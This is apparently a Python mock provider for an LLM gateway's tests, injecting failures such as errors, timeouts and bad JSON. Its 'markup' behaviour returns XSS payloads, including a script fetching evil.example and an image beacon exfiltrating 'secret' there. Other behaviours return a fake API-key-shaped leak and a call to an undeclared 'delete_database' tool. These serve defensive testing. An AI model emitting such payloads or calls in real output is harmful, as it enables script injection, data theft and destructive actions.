from __future__ import annotations

import asyncio
import hashlib
import json
import time
import uuid
from collections.abc import AsyncIterator
from typing import Any

from ..policy import ModelSpec
from .base import CallOutcome, StreamHandle


def _text(content: Any) -> str:
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        return " ".join(str(p.get("text", "")) if isinstance(p, dict) else str(p) for p in content)
    return ""


def _estimate_prompt(payload: dict[str, Any]) -> int:
    msgs = payload.get("messages") or []
    return sum(len(_text(m.get("content"))) for m in msgs) // 4 + 4 * len(msgs)


class MockProvider:
    """Deterministic provider for tests and demos, with failure injection.

    Behaviors (per model id, or '*'): ok, error_500, error_429, timeout,
    malformed, bad_json, empty (a reply with no text), leak (a reply containing a key-shaped secret),
    markup (a reply with script-like HTML and an image beacon), tool_call (a reply that calls an undeclared tool),
    slow_stream (a stream that takes about half a second, to test what is held while a stream is open). Injection is only honored when the gateway allows it
    (GATEWAY_ALLOW_MOCK_CONTROL).
    """

    name = "mock"

    def __init__(self, latency_scale: float = 0.05):
        self._scale = latency_scale

    def _behavior(self, spec: ModelSpec, extra: dict[str, Any]) -> str:
        beh = extra.get("mock_behavior") or {}
        return beh.get(spec.id) or beh.get("*") or "ok"

    def _reply(self, spec: ModelSpec, payload: dict[str, Any], behavior: str) -> str:
        msgs = payload.get("messages") or []
        full = " ".join(_text(m.get("content")) for m in msgs)
        if "TASK_CLASSIFIER" in full:
            task = "chat"
            if "MOCK_CLASSIFY:" in full:
                task = full.split("MOCK_CLASSIFY:", 1)[1].split()[0].strip(".,;\"'")
            return json.dumps({"task_type": task, "complexity": "low"})
        last = next((_text(m.get("content")) for m in reversed(msgs) if m.get("role") == "user"), "")
        echo = last[:120]
        wants_json = (payload.get("response_format") or {}).get("type") in ("json_object", "json_schema")
        if behavior == "bad_json":
            return "this is not json"
        if behavior == "empty":
            return ""
        if behavior == "markup":
            return (
                "Here: <script>fetch('//evil.example/x')</script> <img src=x onerror=alert(1)> "
                "![pixel](https://evil.example/c?d=secret) [open](javascript:alert(1)) and `<script>kept</script>`"
            )
        if behavior == "leak":  # built at run time so no key-shaped literal sits in the source
            return "here you go: sk-proj-" + hashlib.sha256(spec.id.encode()).hexdigest()[:40]
        if wants_json:
            return json.dumps({"result": echo, "model": spec.id})
        return f"[{spec.id}] {echo}"

    def _fail(self, behavior: str, t0: float) -> CallOutcome | None:
        lat = (time.perf_counter() - t0) * 1000
        if behavior == "timeout":
            return CallOutcome(ok=False, error_class="timeout", error_message="mock timeout", latency_ms=lat)
        if behavior == "error_500":
            return CallOutcome(ok=False, status_code=500, error_class="server_error",
                               error_message="mock upstream error", latency_ms=lat)
        if behavior == "error_429":
            return CallOutcome(ok=False, status_code=429, error_class="rate_limit",
                               error_message="mock rate limited", latency_ms=lat)
        if behavior == "error_429_ra":
            return CallOutcome(ok=False, status_code=429, error_class="rate_limit",
                               error_message="mock rate limited", latency_ms=lat, retry_after_s=2.0)
        if behavior == "error_401":
            return CallOutcome(ok=False, status_code=401, error_class="auth_error",
                               error_message="mock invalid api key", latency_ms=lat)
        return None

    async def complete(
        self, spec: ModelSpec, payload: dict[str, Any], *, timeout_s: float, extra: dict[str, Any]
    ) -> CallOutcome:
        t0 = time.perf_counter()
        behavior = self._behavior(spec, extra)
        await asyncio.sleep(spec.latency_ms_p50 * self._scale / 1000)
        failed = self._fail(behavior, t0)
        if failed:
            return failed
        lat = (time.perf_counter() - t0) * 1000
        if behavior == "malformed":
            return CallOutcome(ok=True, status_code=200, latency_ms=lat, ttft_ms=lat,
                               body={"id": "mock", "object": "chat.completion"})
        text = self._reply(spec, payload, behavior)
        usage = {"prompt_tokens": _estimate_prompt(payload), "completion_tokens": max(1, len(text) // 4),
                 "cached_tokens": 0}
        message: dict[str, Any] = {"role": "assistant", "content": text}
        if behavior == "tool_call":
            message = {"role": "assistant", "content": None, "tool_calls": [
                {"id": "call_1", "type": "function", "function": {"name": "delete_database", "arguments": "{}"}}]}
        body = {
            "id": "chatcmpl-" + uuid.uuid4().hex[:12],
            "object": "chat.completion",
            "created": int(time.time()),
            "model": spec.model,
            "choices": [{"index": 0, "message": message, "finish_reason": "stop"}],
            "usage": {"prompt_tokens": usage["prompt_tokens"], "completion_tokens": usage["completion_tokens"],
                      "total_tokens": usage["prompt_tokens"] + usage["completion_tokens"]},
        }
        return CallOutcome(ok=True, status_code=200, latency_ms=lat, ttft_ms=lat, body=body, usage=usage)

    async def open_stream(
        self,
        spec: ModelSpec,
        payload: dict[str, Any],
        *,
        timeout_s: float,
        first_token_timeout_s: float,
        extra: dict[str, Any],
    ) -> CallOutcome:
        t0 = time.perf_counter()
        behavior = self._behavior(spec, extra)
        await asyncio.sleep(spec.latency_ms_p50 * self._scale * 0.4 / 1000)
        failed = self._fail(behavior, t0)
        if failed:
            return failed
        text = self._reply(spec, payload, behavior)
        words = text.split(" ")
        cid = "chatcmpl-" + uuid.uuid4().hex[:12]
        prompt_tokens = _estimate_prompt(payload)

        def chunk(delta: dict[str, Any], finish: str | None = None, usage: dict | None = None) -> str:
            obj: dict[str, Any] = {
                "id": cid, "object": "chat.completion.chunk", "model": spec.model,
                "choices": [{"index": 0, "delta": delta, "finish_reason": finish}] if usage is None else [],
            }
            if usage is not None:
                obj["usage"] = usage
            return f"data: {json.dumps(obj)}\n\n"

        async def gen() -> AsyncIterator[str]:
            for i, w in enumerate(words):
                if behavior == "slow_stream":
                    await asyncio.sleep(0.05)
                yield chunk({"content": w + (" " if i < len(words) - 1 else "")})
            yield chunk({}, finish="stop")
            yield chunk({}, usage={"prompt_tokens": prompt_tokens, "completion_tokens": len(words),
                                   "total_tokens": prompt_tokens + len(words)})
            yield "data: [DONE]\n\n"

        async def closer() -> None:
            return None

        it = gen()
        first = chunk({"role": "assistant", "content": ""})
        handle = StreamHandle(first=first, iterator=it, closer=closer)
        ttft = (time.perf_counter() - t0) * 1000
        return CallOutcome(ok=True, status_code=200, latency_ms=ttft, ttft_ms=ttft, stream=handle)
